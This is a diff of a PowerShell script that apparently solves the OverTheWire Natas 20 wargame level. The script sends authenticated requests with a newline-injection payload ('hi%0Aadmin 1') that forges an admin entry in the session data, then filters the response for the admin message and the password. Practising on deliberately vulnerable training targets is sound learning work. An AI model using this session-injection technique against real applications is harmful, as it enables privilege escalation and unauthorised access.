@@ -1,24 +1,17 @@
 param (
-    [string]$sessionStr,
+    [Parameter(Mandatory=$true)]
+    [string]$server,
+    [Parameter(Mandatory=$true)]
+    [string]$username,
+    [Parameter(Mandatory=$true)]
+    [string]$password,
+    [Parameter(Mandatory=$true)]
     [string]$name
 )
-
-$server = "natas20.......overthewire.org" 
-#$server = "localhost:8000"
-
-
-$url = "http://$server/index.php?debug&name="
+$url = $server
 
 #solution is like this: "hi%0Aadmin 1"
 #"hi"->puts something in name. "%0A"->is a newline character "admin 1"-> after the newline character, abuse the poor encoding
-if ($name) {
-     $url += $name
-} else {
-    $url += ''
-}
-
-$username = ""
-$password = ""
 
 $pair = "${username}:${password}"
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
@@ -31,20 +24,14 @@ $headers = @{
 }
 
 $commandurl = $url;
+$response = iwr -Headers $headers -URI $url -SessionVariable requestSession;
 
-$cookieContainer = New-Object System.Net.CookieContainer
-
-$cookie = New-Object System.Net.Cookie("PHPSESSID", $sessionStr, "/", $server)
-$cookieContainer.Add($cookie)
-    
-$requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
-$requestSession.Cookies = $cookieContainer;
+$commandurl = $url + "?debug&name=$name";
+$response = iwr -Headers $headers -URI $commandurl -Method Post -WebSession  $requestSession;
 
 $commandurl = $url;
-$response = Invoke-WebRequest -Headers $headers -URI $commandurl -WebSession $requestSession;
+$response = iwr -Headers $headers -URI $commandurl -Method Get -WebSession  $requestSession;
 
-#i should use this in every of these previous levels
-$filtered = ((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -notmatch "<|>" }) -join "`n"
-Write-Host $filtered
-
-Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'our name: <input name="name" value="' }) -join "`n")
+write-host `n$response.Content`n"---------------------------------------------------------"
+Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'You are an admin' }) -join "`n")
+Write-Host (((($response.Content -replace "<br>", "`n") -split "`n") | Where-Object { $_ -match 'Password' }) -join "`n")`n"---------------------------------------------------------"
